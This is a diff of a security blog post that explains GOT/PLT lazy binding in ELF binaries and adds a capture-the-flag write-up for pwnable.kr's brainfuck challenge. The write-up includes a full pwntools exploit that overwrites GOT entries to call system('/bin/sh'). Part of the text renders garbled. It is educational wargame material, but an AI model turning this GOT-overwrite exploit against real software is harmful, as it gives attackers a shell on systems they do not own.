@@ -86,13 +86,10 @@
 <meta property="og:site_name" content="Feng&#39;s Blog">
 <meta property="og:description" content="In this post we study how system handle dynamically linked functions (external functions). I will first illustrate the process of how system find the linked function address for a given elf. And I wil">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://blog.fxiao.me/got-plt/first_lookup.jpg">
-<meta property="og:image" content="http://blog.fxiao.me/got-plt/second_lookup.jpg">
-<meta property="og:updated_time" content="2019-03-02T21:29:29.327Z">
+<meta property="og:updated_time" content="2019-03-03T01:01:50.386Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwn the GOT!">
 <meta name="twitter:description" content="In this post we study how system handle dynamically linked functions (external functions). I will first illustrate the process of how system find the linked function address for a given elf. And I wil">
-<meta name="twitter:image" content="http://blog.fxiao.me/got-plt/first_lookup.jpg">
 
 
 
@@ -324,14 +321,24 @@
 </ul>
 <h2 id="Demonstrating-the-Relocation"><a href="#Demonstrating-the-Relocation" class="headerlink" title="Demonstrating the Relocation"></a>Demonstrating the Relocation</h2><p>Here we gdb a simple program to demonstrate how relocation happens. </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//test.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;1234&quot;);</span><br><span class="line">    printf(&quot;5678&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>First, we step into the printf for 1234.<br>As we can see, <code>call printf@plt</code> will first go into the .plt sections. In this section, we found that it will dereference an pointer (rip+0x200c12) and jmp to it. We found that it will jump to the next instruction as shown in the picture, which corresponds to the first-time lookup code stub. </p>
-<img src="/got-plt/first_lookup.jpg">
-<p>At 0x4003f0, I notice a combination (push,jmp) which is similar to the function calling proess.  By <code>info symbol</code> the jmp address at 0x4003f6, I found the control flow will be jump to _dl_rumtime_resolve_xsave in .text. I guess this is the internal procedure of first-time lookup. We will not touch the detail of it since this is not the point in this post. </p>
-<p>Then, I run the program into the second printf and examine the same thing. Something interesting happened! The program will still dereference a pointer (which is in fact stored in the .got.plt as shown in figure 2). However, this time, the pointer points directly to the libc, instead of the first-time lookup code stub. It means that the corresponding item in the .got.plt has been updated to point to the real printf function in the libc.</p>
-<img src="/got-plt/second_lookup.jpg">
-<p>This process is called Lazy Binding, which accelerate the loading time for an elf (kernel only look up the address for external functions when they are used).</p>
-<h2 id="BrainFuck-in-Pwnable-kr"><a href="#BrainFuck-in-Pwnable-kr" class="headerlink" title="BrainFuck in Pwnable.kr"></a>BrainFuck in Pwnable.kr</h2><p>In this section, I will demonstrate how we hijack GOT to gain control flow of a vulnerable program. </p>
-<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>[1] <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></p>
+<p>First, we step into the printf for 1234.<br>As we can see, <figure class="highlight plain"><figcaption><span>printf@plt``` will first go into the .plt sections. In this section, we found that it will dereference an pointer (rip+0x200c12) and jmp to it. We found that it will jump to the next instruction as shown in the picture, which corresponds to the first-time lookup code stub. </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img first_lookup.jpg %&#125;</span><br><span class="line"></span><br><span class="line">At 0x4003f0, I notice a combination (push,jmp) which is similar to the function calling proess.  By ```info symbol``` the jmp address at 0x4003f6, I found the control flow will be jump to \_dl\_rumtime\_resolve\_xsave in .text. I guess this is the internal procedure of first-time lookup. We will not touch the detail of it since this is not the point in this post. </span><br><span class="line"></span><br><span class="line">Then, I run the program into the second printf and examine the same thing. Something interesting happened! The program will still dereference a pointer (which is in fact stored in the .got.plt as shown in figure 2). However, this time, the pointer points directly to the libc, instead of the first-time lookup code stub. It means that the corresponding item in the .got.plt has been updated to point to the real printf function in the libc.</span><br><span class="line"></span><br><span class="line">&#123;% asset_img second_lookup.jpg %&#125;</span><br><span class="line"></span><br><span class="line">This process is called Lazy Binding, which accelerate the loading time for an elf (kernel only look up the address for external functions when they are used).</span><br><span class="line"></span><br><span class="line">## BrainFuck in Pwnable.kr</span><br><span class="line">In this section, I will demonstrate how we hijack GOT to gain control flow of a vulnerable program. The vulnerable program on pwnable provides arbitrary write/read. So we can hijack the .got (which is in fact the .got.plt) to get shell. It is worth noting that memset and fgets share the same types of parameters, so they are suitable to be replaced as fgets and system.</span><br><span class="line"> </span><br><span class="line">&#123;% asset_img got-plt.jpg %&#125;</span><br><span class="line"></span><br><span class="line">With the help of IDA, we can easily locate the address of necessary functions in GOT. However, this is not enough. To replace runtime addr of```fgets``` with runtime addr of ```system```, we need one more info, i.e, we need the runtime address system in libc. This can be calculated by a runtime address of any function and its offset to ```system``` in libc (This program provide its libc.so for us).</span><br><span class="line">So the attack steps are now clear:</span><br><span class="line"></span><br><span class="line">Step 0, overwrite putchar to main </span><br><span class="line">Step 1, overwrite memset to gets</span><br><span class="line">Step 2, overwrite fgets to system</span><br><span class="line">Step 3, call putchar(main) and send &apos;/bin/sh&apos;</span><br></pre></td></tr></table></figure></p>
+<p>exp.py<br>from pwn import *</p>
+<p>context.log_level = ‘debug’<br>p = process(‘bf’)<br>libc = ELF(‘bf_libc.so’)</p>
+<p>#p = remote(‘pwnable.kr’,9001)</p>
+<p>def back(n):<br>    return ‘&lt;’<em>n<br>def read(n):<br>    return ‘.&gt;’</em>n<br>def write(n):<br>    return ‘,&gt;’*n</p>
+<p>putchar_got = 0x0804A030<br>ptr         = 0x0804A0A0<br>main        = 0x08048671</p>
+<p>#read runtime addr of putchar<br>payload =  back(ptr - putchar_got) + ‘.’ + read(4)  # . is for loading runtime addr</p>
+<p>#overwrite putchar to main<br>payload += back(4+0) + write(4)</p>
+<p>#overwrite memset to gets<br>payload += back(4+4) + write(4)</p>
+<p>#overwrite gets to system<br>payload += back(28+4) + write(4)</p>
+<p>#call putchar (main)<br>payload += ‘.’</p>
+<p>p.recvuntil(‘[ ]\n’)</p>
+<p>p.sendline(payload)<br>p.recv(1) # junk data for .</p>
+<p>putchar_libc = libc.symbols[‘putchar’]<br>gets_libc    = libc.symbols[‘gets’]<br>system_libc  = libc.symbols[‘system’]<br>putchar_addr = u32(p.recv(4))</p>
+<p>#gdb.attach(p)<br>p.send(p32(main))<br>p.send(p32(putchar_addr+gets_libc-putchar_libc))<br>p.send(p32(putchar_addr+system_libc-putchar_libc))</p>
+<p>p.sendline(‘//bin/sh\0’)<br>p.interactive()</p>
+<p>```</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></p>
 
       
     </div>
@@ -500,7 +507,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demonstrating-the-Relocation"><span class="nav-number">2.</span> <span class="nav-text">Demonstrating the Relocation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BrainFuck-in-Pwnable-kr"><span class="nav-number">3.</span> <span class="nav-text">BrainFuck in Pwnable.kr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demonstrating-the-Relocation"><span class="nav-number">2.</span> <span class="nav-text">Demonstrating the Relocation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
